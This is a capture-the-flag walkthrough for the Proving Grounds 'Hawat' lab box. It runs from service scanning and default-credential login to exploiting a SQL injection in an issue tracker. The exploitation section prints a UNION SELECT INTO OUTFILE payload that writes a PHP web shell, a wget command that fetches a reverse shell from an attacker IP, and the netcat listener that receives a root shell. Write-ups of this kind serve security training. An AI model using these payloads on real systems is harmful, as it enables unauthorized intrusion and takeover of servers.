---
layout: default
title: Hawat
parent: Proving Grounds Practice - Linux
nav_order: 4
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/hawat]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.232.147

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey:
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
17445/tcp open  unknown
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: DENY
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Thu, 23 Nov 2023 21:25:34 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <title>Issue Tracker</title>
|     <link href="/css/bootstrap.min.css" rel="stylesheet" />
|     </head>
|     <body>
|     <section>
|     <div class="container mt-4">
|     <section>                                                                                  [49/91]
|     <div class="container mt-4">
|     <span>
|     <div>
|     href="/login" class="btn btn-primary" style="float:right">Sign In</a>
|     href="/register" class="btn btn-primary" style="float:right;margin-right:5px">Register</a>
|     </div>
|     </span>
|     <br><br>
|     <table class="table">
|     <thead>
|     <tr>
|     <th>ID</th>
|     <th>Message</th>
|     <th>P
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET,HEAD,OPTIONS
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: DENY
|     Content-Length: 0
|     Date: Thu, 23 Nov 2023 21:25:34 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Thu, 23 Nov 2023 21:25:34 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {c
olor:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {
font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head
><body><h1>HTTP Status 400
|_    Request</h1></body></html>
30455/tcp open  http    nginx 1.18.0
|_http-title: W3.CSS
|_http-server-header: nginx/1.18.0
50080/tcp open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15
|_http-title: W3.CSS Template

```

# Enumeration

---

## 17445 | HTTP

![index](../../../assets/images/ctfs/proving_grounds/hawat/index.png)
![users](../../../assets/images/ctfs/proving_grounds/hawat/users.png)

## 30455 | HTTP

![sale](../../../assets/images/ctfs/proving_grounds/hawat/sale.png)

Run Gobuster scan:

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/clamav]
└─$ gobuster dir -u http://192.168.232.147:30455 -w /usr/share/wordlists/custom/large_final.txt -x aspx,
php,txt,conf -t 80 -k                                                                                   ===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.232.147:30455
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/custom/large_final.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              aspx,php,txt,conf
[+] Timeout:                 10s
===============================================================
2023/11/23 17:07:31 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 3356]
/4                    (Status: 301) [Size: 169] [--> http://192.168.232.147:30455/4/]
/phpinfo.php          (Status: 200) [Size: 68610]

```

Checking _phpinfo.php_ we see the document root is _/srv/http_

![root](../../../assets/images/ctfs/proving_grounds/hawat/root.png)

## 50080 | HTTP

Gobuster returns _/cloud_ directory.

![cloud](../../../assets/images/ctfs/proving_grounds/hawat/cloud.png)

Authenticate with default credentials _admin:admin_

![admin](../../../assets/images/ctfs/proving_grounds/hawat/admin.png)

Download the _issuetracker.zip_ file and look through files.

Locate DB creds in _appliation.properties_ but cannot find anywhere to use them.

```bash
┌──(vagrant㉿kali)-[~/Downloads/issuetracker/src/main/resources]
└─$ cat application.properties
spring.datasource.url=jdbc:mysql://localhost:3306/issue_tracker?serverTimeZone=UTC
spring.datasource.username=issue_user
spring.datasource.password=ManagementInsideOld797
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver

spring.jpa.hibernate.ddl-auto=update
server.port=17445

```

Review source code and find SQL Injection exploit.

![sql](../../../assets/images/ctfs/proving_grounds/hawat/sql.png)

Attempt that page and receive a 405 error (Method not allowed)

Send to Burp to start working with the vulnerable endpoint.

The response header shows that POST is an allowed method.

![post](../../../assets/images/ctfs/proving_grounds/hawat/post.png)

We send a POST request and receive a 400 error (Bad Request) because the server is expecting a _priority_ value.

Looking in the application we see the _Priority_ types.

![issues](../../../assets/images/ctfs/proving_grounds/hawat/issues.png)

Resending the request with a _priority=Normal_ query set in the request header we receive a 200 response.

# Exploitation

---

Now we can proceed with tryining to exploit the SQL injection vulnerability.

Run an the following payload URL encoded to get a PHP web shell.

```bash
' UNION SELECT "<?php echo system($_GET['cmd']); ?>" INTO OUTFILE '/srv/http/cmd.php'; -- -

# URL Encoded (urlencoder.org)

%27%20UNION%20SELECT%20%22%3C%3Fphp%20echo%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%20INTO%20OUTFILE%20%27%2Fsrv%2Fhttp%2Fcmd.php%27%3B%20--%20-
```

![attack](../../../assets/images/ctfs/proving_grounds/hawat/attack.png)

Returning to the PHP site running on port 30455 we can run commands with the PHP web shell.

![cmd](../../../assets/images/ctfs/proving_grounds/hawat/cmd.png)

Now we can leverage the PHP reverse shell to get a reverse shell on a netcat listener.

Copy php-reverse-shell.php to the pwd on the attack box and change the parameters as necessary.

URL encode the following payload to download to the PHP reverse shell to the target.

```bash
wget http://192.168.45.217:30455/rev.php -o /srv/http/rev.php

# URL encoded (urlencoder.org)

wget%20http%3A%2F%2F192.168.45.217%3A30455%2Frev.php%20-o%20%2Fsrv%2Fhttp%2Frev.php%0A

# Target downloads after executing the above command in the PHP web shell
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/hawat]
└─$ python3 -m http.server 30455
Serving HTTP on 0.0.0.0 port 30455 (http://0.0.0.0:30455/) ...
192.168.232.147 - - [23/Nov/2023 23:29:43] "GET /rev.php HTTP/1.1" 200 -

```

Use curl to hit the uploaded rev.php reverse shell and get a reverse shell on our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ curl http://192.168.232.147:30455/rev.php

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/hawat]
└─$ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.232.147] 51890
Linux hawat 5.10.14-arch1-1 #1 SMP PREEMPT Sun, 07 Feb 2021 22:42:17 +0000 x86_64 GNU/Linux
 04:35:31 up  1:40,  0 users,  load average: 0.09, 0.06, 0.03
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
sh: cannot set terminal process group (565): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.1# id
id
uid=0(root) gid=0(root) groups=0(root)


```

# Post-Exploitation

---

The exploit provided a root shell so no post-exploitation is required.
